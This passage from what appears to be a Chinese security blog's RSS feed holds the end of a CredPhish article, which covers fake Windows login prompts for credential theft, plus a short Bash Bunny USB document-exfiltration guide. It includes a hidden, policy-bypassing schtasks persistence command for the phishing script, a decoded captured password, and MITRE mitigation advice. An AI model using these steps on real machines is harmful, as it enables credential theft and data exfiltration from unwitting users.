&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib.parse&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquote&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%26e&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;cuRe-P&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%40s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sw&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%25r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%23%&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;5D&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/DESKTOP-S4DAAF0[tokyoneon:#!Extr3m3Ly_&amp;amp;ecuRe-P@ssw&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;D#]&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;credphishps1执行&#34;&gt;CredPhish.ps1执行
&lt;/h2&gt;&lt;p&gt;要快速测试CredPhish，请将&lt;strong&gt;credphish.ps1&lt;/strong&gt;移动到目标Windows 10机器并使用PowerShell执行它。&lt;/p&gt;
&lt;p&gt;一种持久化执行方法可能涉及&lt;strong&gt;任务计划程序&lt;/strong&gt;，这是Windows的一个组件，允许在预定义的时间间隔调度脚本执行。以下&lt;strong&gt;schtasks&lt;/strong&gt;示例将每2分钟执行一次&lt;strong&gt;credphish.ps1&lt;/strong&gt;。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;schtasks&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sc &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;minute&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mo&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tn&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;credphish&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tr&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;powershell -ep bypass -WindowStyle Hidden C:\path\to\credPhish\credphish.ps1&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;缓解与检测&#34;&gt;缓解与检测
&lt;/h2&gt;&lt;p&gt;CredPhish源自&lt;strong&gt;Invoke-LoginPrompt&lt;/strong&gt;、&lt;strong&gt;CredsLeaker&lt;/strong&gt;和&lt;strong&gt;Stitch&lt;/strong&gt;等项目，并不是密码钓鱼的终极解决方案。由于此类攻击通常非常针对用户，因此仍有改进空间。更激进的方法可能涉及使用Cobalt Strike伪造整个Windows 10锁屏并通过这种方式捕获凭证。&lt;/p&gt;
&lt;p&gt;这类攻击技术难以通过预防性控制措施缓解，因为它们滥用了系统功能。&lt;strong&gt;MITRE ATT&amp;amp;CK框架&lt;/strong&gt;建议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过&lt;strong&gt;用户培训&lt;/strong&gt;提高对潜在恶意事件和对话框（例如Office文档提示输入凭证）的意识和警惕性。&lt;/li&gt;
&lt;li&gt;监控进程执行，检测异常程序和恶意实例的&lt;strong&gt;命令和脚本解释器&lt;/strong&gt;，这些程序可能会提示用户输入凭证。&lt;/li&gt;
&lt;li&gt;检查并审查输入提示的非法性指标，例如非传统的横幅、文本、时间和/或来源。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>使用Bash Bunny获取USB_Exfiltration载荷的实战指南</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8bash-bunny%E8%8E%B7%E5%8F%96usb_exfiltration%E8%BD%BD%E8%8D%B7%E7%9A%84%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 13:57:49 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8bash-bunny%E8%8E%B7%E5%8F%96usb_exfiltration%E8%BD%BD%E8%8D%B7%E7%9A%84%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;使用bash-bunny获取usb_exfiltration载荷&#34;&gt;使用Bash Bunny获取USB_Exfiltration载荷
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者：Jordan Drysdale // 红队工具专家&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是一篇关于我们首次测试并确认在所有启用PowerShell的Windows系统（XP-SP3及以上版本）上100%可靠的实用载荷的快速技术指南。&lt;/p&gt;
&lt;h2 id=&#34;关键资源&#34;&gt;关键资源
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Bash Bunny Wiki&lt;/strong&gt;: &lt;a class=&#34;link&#34; href=&#34;http://wiki.bashbunny.com/#!index.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://wiki.bashbunny.com/#!index.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;载荷源码&lt;/strong&gt;: &lt;a class=&#34;link&#34; href=&#34;https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/usb_exfiltrator&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/usb_exfiltrator&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术要点&#34;&gt;技术要点
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;开关位置与目录结构&lt;/strong&gt;&lt;br&gt;
理解极其简单的开关位置配置和目录结构是成功的关键。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;载荷获取与修改&lt;/strong&gt;&lt;br&gt;
我们从Bunny的Git仓库下载了全部现有载荷：&lt;a class=&#34;link&#34; href=&#34;https://github.com/hak5/bashbunny-payloads&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/hak5/bashbunny-payloads&lt;/a&gt;&lt;br&gt;
在将USB_Exfil载荷复制到switch1目录前，我们移除了.PDF引用，这使得我们可以获取用户文档目录下的子目录。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;重要警告&#34;&gt;重要警告
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;存储空间限制&lt;/strong&gt;&lt;br&gt;
根据目标文档目录的大小，Bash Bunny的存储空间可能被占满（最大约2GB）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;系统状态要求&lt;/strong&gt;&lt;br&gt;
测试表明目标系统必须处于解锁状态才能生效。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;无论如何，祝您探索愉快！&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        
    </channel>
</rss>
